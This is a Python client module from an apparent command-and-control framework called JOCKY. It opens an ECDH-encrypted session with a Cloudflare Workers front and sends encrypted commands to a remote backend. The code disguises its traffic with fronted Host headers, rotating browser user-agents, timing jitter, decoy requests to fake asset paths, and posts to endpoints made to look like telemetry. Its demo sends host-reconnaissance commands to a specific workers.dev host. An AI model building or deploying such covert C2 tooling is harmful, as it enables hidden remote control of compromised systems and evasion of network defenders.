"""
JOCKY Framework — Module 1c: C2 Channel Client (Crypto v1.0)
ECDH handshake + AES-256-GCM encrypted payloads.
"""

import requests
import random
import time
import hashlib
import os
import json
import base64
from datetime import datetime, timezone
from pathlib import Path
import sys

sys.path.insert(0, str(Path(__file__).parent))
from protocol import CommandRequest, CommandResponse, PROTOCOL_VERSION
from crypto import generate_keypair, derive_shared_secret, derive_aes_key, SecureSession
import requests
# Force IPv4 — Kali VM has no working IPv6 route to Cloudflare
import urllib3.util.connection as _u3_conn
_u3_conn.HAS_IPV6 = False

class JockyC2Channel:
    def __init__(self, cdn_front: str, c2_backend: str, log_path: str = "logs/c2.log"):
        self.cdn_front = cdn_front.rstrip("/")
        self.c2_backend = c2_backend
        self.log_path = Path(log_path)
        self.log_path.parent.mkdir(parents=True, exist_ok=True)

        self.user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_0) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
        ]

        self.dummy_endpoints = [
            "/static/js/analytics.js",
            "/assets/img/logo.png",
            "/api/v2/health",
            "/cdn-cgi/trace",
            "/favicon.ico",
        ]

        self.legit_endpoints = [
            "/api/v1/telemetry",
            "/api/v1/metrics",
            "/api/v1/events",
        ]

        # Session state
        self.session: SecureSession = None
        self.session_id: str = None

    # ---------- Handshake ----------
    def _headers(self) -> dict:
        return {
            "Host": self.c2_backend,
            "User-Agent": random.choice(self.user_agents),
            "Content-Type": "application/json",
            "Accept": "application/json, text/plain, */*",
            "X-Request-ID": ''.join(random.choices('0123456789abcdef', k=16)),
            "X-Client-Time": datetime.now(timezone.utc).isoformat(),
        }

    def _jitter(self):
        time.sleep(random.uniform(0.05, 0.30))

    def send_dummy(self):
        try:
            url = self.cdn_front + random.choice(self.dummy_endpoints)
            requests.get(url, timeout=2, headers={"User-Agent": random.choice(self.user_agents)})
        except Exception:
            pass

    def handshake(self) -> bool:
        """Perform ECDH key exchange with the server."""
        self._jitter()
        priv_C, pub_C = generate_keypair()
        pub_C_b64 = base64.urlsafe_b64encode(pub_C).decode()

        url = self.cdn_front + "/api/v1/handshake"
        try:
            r = requests.post(
                url,
                json={"pub": pub_C_b64, "ver": PROTOCOL_VERSION},
                headers=self._headers(),
                timeout=5,
            )
            body = r.json()
            pub_S = base64.urlsafe_b64decode(body["pub"].encode())
            sid = body["session_id"]
        except Exception as e:
            print(f"  [!] Handshake failed: {e}")
            return False

        shared = derive_shared_secret(priv_C, pub_S)
        aes_key = derive_aes_key(shared, salt=sid.encode())
        self.session = SecureSession(aes_key, session_id=sid)
        self.session_id = sid

        print(f"  [+] Handshake complete — session {sid}")
        print(f"      Shared secret sha256: {hashlib.sha256(shared).hexdigest()[:16]}")
        return True

    # ---------- Send command ----------
    def send_command(self, command: str, args: dict = None) -> CommandResponse:
        if not self.session:
            raise RuntimeError("No session — call handshake() first")

        args = args or {}
        self._jitter()
        if random.random() < 0.15:
            self.send_dummy()

        req = CommandRequest(command=command, args=args)
        # Attach session counter for replay protection
        payload = req.to_dict()
        payload["_ctr"] = self.session.counter

        ciphertext = self.session.encrypt(payload)

        endpoint = random.choice(self.legit_endpoints)
        url = self.cdn_front + endpoint

        record = {
            "ts": datetime.now(timezone.utc).isoformat(),
            "task_id": req.task_id,
            "session_id": self.session_id,
            "counter": payload["_ctr"],
            "command": command,
            "args": args,
            "ciphertext_len": len(ciphertext),
            "ciphertext_hash": hashlib.sha256(ciphertext.encode()).hexdigest()[:16],
            "sni": self.cdn_front.replace("https://", "").replace("http://", ""),
            "host_header": self.c2_backend,
            "endpoint": endpoint,
            "status": None,
            "response": None,
            "error": None,
        }

        try:
            r = requests.post(url, json={"d": ciphertext}, headers=self._headers(), timeout=4)
            record["status"] = r.status_code
            body = r.json()
            if "response_ct" in body:
                decrypted = self.session.decrypt(body["response_ct"])
                record["response"] = decrypted
        except Exception as e:
            record["error"] = str(e)
            record["status"] = "FAILED"

        self._log(record)
        if record["response"]:
            return CommandResponse.from_dict(record["response"])
        return CommandResponse(task_id=req.task_id, status="error", error=record.get("error", "no response"))

    def _log(self, record: dict):
        with self.log_path.open("a") as f:
            f.write(json.dumps(record) + "\n")


# ---------- Demo ----------
if __name__ == "__main__":
    print("=" * 70)
    print(f"JOCKY C2 Channel — Crypto v{PROTOCOL_VERSION}")
    print("=" * 70)

    WORKER_URL = os.environ.get(
        "JOCKY_FRONT",
        "https://jocky-cdn-front.g-surya-prakash.workers.dev",
    )
    # SNI and Host MUST match — Cloudflare enforces this
    WORKER_HOST = WORKER_URL.replace("https://", "").replace("http://", "")
    ch = JockyC2Channel(
        cdn_front=WORKER_URL,
        c2_backend=WORKER_HOST,
    )
    print("\n[TEST] ECDH handshake")
    if not ch.handshake():
        sys.exit(1)

    print("\n[TEST] Encrypted command dispatch")
    tests = [
        ("collect_system_info", {}),
        ("list_processes", {"limit": 3}),
        ("enumerate_network_connections", {"proto": "tcp"}),
        ("scan_forensic_artifacts", {"paths": ["/var/log", "/tmp"]}),
        ("check_persistence", {}),
    ]

    for cmd, args in tests:
        resp = ch.send_command(cmd, args)
        tid = resp.task_id[:8]
        preview = json.dumps(resp.result)[:45] if resp.result else resp.error
        print(f"  [{tid}] {cmd:35s} → {resp.status:8s} | {preview}...")

    print("\n[OK] Log: logs/c2.log")
